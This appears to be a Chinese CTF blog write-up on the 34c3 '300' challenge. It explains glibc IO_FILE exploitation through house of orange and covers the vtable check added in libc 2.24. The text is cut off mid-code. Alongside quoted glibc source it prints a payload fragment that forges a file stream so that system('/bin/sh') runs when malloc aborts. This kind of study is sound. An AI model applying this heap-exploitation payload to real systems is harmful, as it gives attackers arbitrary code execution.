{"title":"34c3の300_IOFILE","slug":"34c3の300-IOFILE","date":"2018-01-04T14:46:14.000Z","updated":"2018-01-04T14:57:30.063Z","comments":true,"excerpt":"","content":"<h2 id=\"prefix\"><a href=\"#prefix\" class=\"headerlink\" title=\"prefix\"></a>prefix</h2><p><code>IO_FILE</code>的姿势之前一直没有好好弄明白，这里梳理学习一下，以<code>34c3</code>的<code>300</code>为例子</p>\n<h2 id=\"house-of-orange\"><a href=\"#house-of-orange\" class=\"headerlink\" title=\"house of orange\"></a>house of orange</h2><p>回顾一下<code>house of orange</code>，首先看<code>malloc</code>源码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/** _int_malloc **/</span></span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> iters = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    bck = victim-&gt;bk;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class=\"number\">2</span> * SIZE_SZ, <span class=\"number\">0</span>)</span><br><span class=\"line\">        || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class=\"number\">0</span>))</span><br><span class=\"line\">      malloc_printerr (check_action, <span class=\"string\">\"malloc(): memory corruption\"</span>,</span><br><span class=\"line\">                       chunk2mem (victim), av);</span><br><span class=\"line\">    size = chunksize (victim);</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"异常执行流程\"><a href=\"#异常执行流程\" class=\"headerlink\" title=\"异常执行流程\"></a>异常执行流程</h3><p>在<code>malloc</code>的时候，如果检查到<code>unsorted bin</code>有异常，则会触发<code>malloc_printerr</code>。跟踪代码就能发现，之后到流程如下<br><code>malloc_printerr-&gt;__libc_message-&gt;abort-&gt;fflush(_IO_flush_all_lockp)-&gt;vtable-&gt;_IO_OVERFLOW</code></p>\n<p><code>malloc_printerr</code><br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\">malloc_printerr (<span class=\"keyword\">int</span> action, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *str, <span class=\"keyword\">void</span> *ptr, mstate ar_ptr)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\">      __libc_message (action &amp; <span class=\"number\">2</span>, <span class=\"string\">\"*** Error in `%s': %s: 0x%s ***\\n\"</span>,</span><br><span class=\"line\">                      __libc_argv[<span class=\"number\">0</span>] ? : <span class=\"string\">\"&lt;unknown&gt;\"</span>, str, cp);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (action &amp; <span class=\"number\">2</span>)</span><br><span class=\"line\">    <span class=\"built_in\">abort</span> ();</span><br><span class=\"line\"><span class=\"comment\">//...</span></span><br></pre></td></tr></table></figure></p>\n<p><code>__libc_message</code><br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\">\t\t__munmap (old, old-&gt;size);</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  va_end (ap);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (do_abort)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      BEFORE_ABORT (do_abort, written, fd);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Kill the application.  */</span></span><br><span class=\"line\">      <span class=\"built_in\">abort</span> ();</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure></p>\n<p><code>abort</code>又调用了<code>_IO_flush_all_lockp</code><br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// abort</span></span><br><span class=\"line\">  <span class=\"keyword\">sigset_t</span> sigs;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* First acquire the lock.  */</span></span><br><span class=\"line\">  __libc_lock_lock_recursive (lock);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Now it's for sure we are alone.  But recursive calls are possible.  */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Unlock SIGABRT.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (stage == <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      ++stage;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (__sigemptyset (&amp;sigs) == <span class=\"number\">0</span> &amp;&amp;</span><br><span class=\"line\">\t  __sigaddset (&amp;sigs, SIGABRT) == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t__sigprocmask (SIG_UNBLOCK, &amp;sigs, (<span class=\"keyword\">sigset_t</span> *) <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Flush all streams.  We cannot close them now because the user</span></span><br><span class=\"line\"><span class=\"comment\">     might have registered a handler for SIGABRT.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (stage == <span class=\"number\">1</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      ++stage;</span><br><span class=\"line\">      fflush (<span class=\"literal\">NULL</span>); <span class=\"comment\">// _IO_flush_all_lockp</span></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure></p>\n<p>而<code>fflush-&gt;_IO_flush_all_lockp</code>，最终调用<code>_IO_OVERFLOW</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// _IO_flush_all</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE</span> *<span class=\"title\">fp</span>;</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> last_stamp;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class=\"line\">  __libc_cleanup_region_start (do_lock, flush_cleanup, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (do_lock)</span><br><span class=\"line\">    _IO_lock_lock (list_all_lock);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">  last_stamp = _IO_list_all_stamp;</span><br><span class=\"line\">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (fp != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      run_fp = fp;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (do_lock)</span><br><span class=\"line\">\t_IO_flockfile (fp);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (((fp-&gt;_mode &lt;= <span class=\"number\">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class=\"line\">#<span class=\"keyword\">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class=\"line\">\t   || (_IO_vtable_offset (fp) == <span class=\"number\">0</span></span><br><span class=\"line\">\t       &amp;&amp; fp-&gt;_mode &gt; <span class=\"number\">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class=\"line\">\t\t\t\t    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class=\"line\">#endif</span><br><span class=\"line\">\t   )</span><br><span class=\"line\">\t  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class=\"line\">\tresult = EOF;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (do_lock)</span><br><span class=\"line\">\t_IO_funlockfile (fp);</span><br><span class=\"line\">      run_fp = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (last_stamp != _IO_list_all_stamp)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  <span class=\"comment\">/* Something was added to the list.  Start all over again.  */</span></span><br><span class=\"line\">\t  fp = (_IO_FILE *) _IO_list_all;</span><br><span class=\"line\">\t  last_stamp = _IO_list_all_stamp;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">\tfp = fp-&gt;_chain;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br></pre></td></tr></table></figure>\n<p>这里<code>_IO_OVERFLOW</code>起初让我有点困惑，然后用<code>ida</code>看了下<code>libc</code>就发现</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v11 = *(_QWORD *)&amp;v3[1]._flags;</span><br><span class=\"line\">if ( (unsigned __int64)(&amp;unk_3BE628 - &amp;unk_3BD8C0) &lt;= *(_QWORD *)&amp;v3[1]._flags - (_QWORD)&amp;unk_3BD8C0 )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  v14 = *(_QWORD *)&amp;v3[1]._flags;</span><br><span class=\"line\">  sub_79870();</span><br><span class=\"line\">  v11 = v14;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if ( (*(unsigned int (__fastcall **)(_IO_FILE *, signed __int64))(v11 + 24))(v3, 0xFFFFFFFFLL) == -1 )</span><br><span class=\"line\">  v6 = -1;</span><br></pre></td></tr></table></figure>\n<p><code>_IO_OVERFLOW</code>实际上就是<code>fp-&gt;vtable</code>中的值(<code>0x18</code>偏移处的函数)</p>\n<p>这就是<code>house of orange</code>利用后程序到执行流程。</p>\n<h3 id=\"伪造方法\"><a href=\"#伪造方法\" class=\"headerlink\" title=\"伪造方法\"></a>伪造方法</h3><p>我们只需要修改<code>vtable</code>就能够劫持程序执行</p>\n<p>不过这里需要满足一定条件<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 1</span></span><br><span class=\"line\">fp-&gt;_mode &lt;= <span class=\"number\">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class=\"line\"><span class=\"comment\">// 2</span></span><br><span class=\"line\">_IO_vtable_offset (fp) == <span class=\"number\">0</span>\t &amp;&amp; fp-&gt;_mode &gt; <span class=\"number\">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br></pre></td></tr></table></figure></p>\n<p><code>1</code>或者<code>2</code>满足一个即可</p>\n<p>但是<code>house of orange</code>中是向<code>_IO_list_all</code>写入值，指向<code>main_arena</code>上，上面一堆的条件我们都无法绕过。怎么办呢？先看下<code>_IO_FILE</code>结构</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE</span> &#123;</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> _flags;\t\t<span class=\"comment\">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> _IO_file_flags _flags</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class=\"line\">  <span class=\"comment\">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span>* _IO_read_ptr;\t<span class=\"comment\">/* Current read pointer */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span>* _IO_read_end;\t<span class=\"comment\">/* End of get area. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span>* _IO_read_base;\t<span class=\"comment\">/* Start of putback+get area. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span>* _IO_write_base;\t<span class=\"comment\">/* Start of put area. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span>* _IO_write_ptr;\t<span class=\"comment\">/* Current put pointer. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span>* _IO_write_end;\t<span class=\"comment\">/* End of put area. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span>* _IO_buf_base;\t<span class=\"comment\">/* Start of reserve area. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span>* _IO_buf_end;\t<span class=\"comment\">/* End of reserve area. */</span></span><br><span class=\"line\">  <span class=\"comment\">/* The following fields are used to support backing up and undo. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *_IO_save_base; <span class=\"comment\">/* Pointer to start of non-current get area. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *_IO_backup_base;  <span class=\"comment\">/* Pointer to first valid character of backup area */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *_IO_save_end; <span class=\"comment\">/* Pointer to end of non-current get area. */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_marker</span> *_<span class=\"title\">markers</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE</span> *_<span class=\"title\">chain</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">int</span> _fileno;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">if</span> 0</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> _blksize;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> _flags2;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">  _IO_off_t _old_offset; <span class=\"comment\">/* This used to be _offset but it's too small.  */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __HAVE_COLUMN <span class=\"comment\">/* temporary */</span></span></span><br><span class=\"line\">  <span class=\"comment\">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">short</span> _cur_column;</span><br><span class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">char</span> _vtable_offset;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> _shortbuf[<span class=\"number\">1</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  _IO_lock_t *_lock;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>这里有一个<code>struct _IO_FILE *_chain;</code>，表示指向下一个<code>_IO_FILE</code>，在<code>flush</code>循环里面是一直通过<code>chain</code>来循环下一个<code>fp</code>的。既然第一个没法满足，我们可以让第二个来满足一下。具体如下</p>\n<p><code>_chain</code>的偏移是<code>0x68</code>，如果通过<code>unsorted bin attack</code>更改了<code>_IO_list_all</code>，在<code>0x68</code>的位置上恰好对应<code>0x60</code>大小的<code>bin list</code>，具体原因看结构<code>main_arena</code>就知道了，这里就不贴了。</p>\n<p>最后构造<code>vtable</code>执行一块地址，<code>0x18</code>为<code>system</code>就可以在触发异常的时候执行<code>system</code>。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload += p32(<span class=\"number\">0xdada</span>) + p32(<span class=\"number\">0x20</span>) + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">stream = <span class=\"string\">\"/bin/sh\\x00\"</span> + p64(<span class=\"number\">0x61</span>) <span class=\"comment\"># fake file stream</span></span><br><span class=\"line\">stream += p64(<span class=\"number\">0xddaa</span>) + p64(io_list_all<span class=\"number\">-0x10</span>) <span class=\"comment\"># Unsortbin attack</span></span><br><span class=\"line\">stream = stream.ljust(<span class=\"number\">0xa0</span>,<span class=\"string\">\"\\x00\"</span>)</span><br><span class=\"line\">stream += p64(heap+<span class=\"number\">0x700</span><span class=\"number\">-0xd0</span>)</span><br><span class=\"line\">stream = stream.ljust(<span class=\"number\">0xc0</span>,<span class=\"string\">\"\\x00\"</span>)</span><br><span class=\"line\">stream += p64(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload += stream</span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload += p64(vtable_addr)</span><br><span class=\"line\">payload += p64(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload += p64(<span class=\"number\">2</span>)</span><br><span class=\"line\">payload += p64(<span class=\"number\">3</span>) </span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> <span class=\"comment\"># vtable</span></span><br><span class=\"line\">payload += p64(system)</span><br></pre></td></tr></table></figure></p>\n<p>具体可以参考<a href=\"http://simp1e.leanote.com/post/Hctf-2017-babyprintf\" target=\"_blank\" rel=\"external\">leanote orange</a>，和<a href=\"http://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\" target=\"_blank\" rel=\"external\">IOFILE 笔记</a></p>\n<h2 id=\"libc2-24の-IO-FILE\"><a href=\"#libc2-24の-IO-FILE\" class=\"headerlink\" title=\"libc2-24の IO_FILE\"></a>libc2-24の IO_FILE</h2><p>在<code>libc-2.24</code>中，新增了对于<code>vtable</code>的检测，<a href=\"https://code.woboq.org/userspace/glibc/libio/vtables.c.html#39\" target=\"_blank\" rel=\"external\">source</a>，查找引用，找到<code>IO_validate_vtable</code>，在找这个函数的引用，可以发现一堆函数都调用了它<code>_IO_OVERFLOW</code>之类的</p>\n<p>参考<a href=\"http://simp1e.leanote.com/post/Hctf-2017-babyprintf\" target=\"_blank\" rel=\"external\">hctf babyprintf</a>，</p>\n<p>可以将<code>vtable</code>指向<code>_IO_jump_t</code>结构体<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct _IO_jump_t</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    JUMP_FIELD(size_t, __dummy);</span><br><span class=\"line\">    JUMP_FIELD(size_t, __dummy2);</span><br><span class=\"line\">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class=\"line\">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class=\"line\">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class=\"line\">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class=\"line\">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class=\"line\">    /* showmany */</span><br><span class=\"line\">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class=\"line\">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class=\"line\">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class=\"line\">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class=\"line\">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class=\"line\">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class=\"line\">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class=\"line\">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class=\"line\">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class=\"line\">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class=\"line\">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class=\"line\">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class=\"line\">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class=\"line\">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class=\"line\">#if 0</span><br><span class=\"line\">    get_column;</span><br><span class=\"line\">    set_column;</span><br><span class=\"line\">#endif</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>这样之后执行的函数就变成<code>_IO_str_overflow</code>(::<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int</span><br><span class=\"line\">_IO_str_overflow (_IO_FILE *fp, int c)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  int flush_only = c == EOF;</span><br><span class=\"line\">  _IO_size_t pos;</span><br><span class=\"line\">  if (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class=\"line\">      return flush_only ? 0 : EOF;</span><br><span class=\"line\">  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class=\"line\">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class=\"line\">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class=\"line\">  if (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */</span><br><span class=\"line\">\treturn EOF;</span><br><span 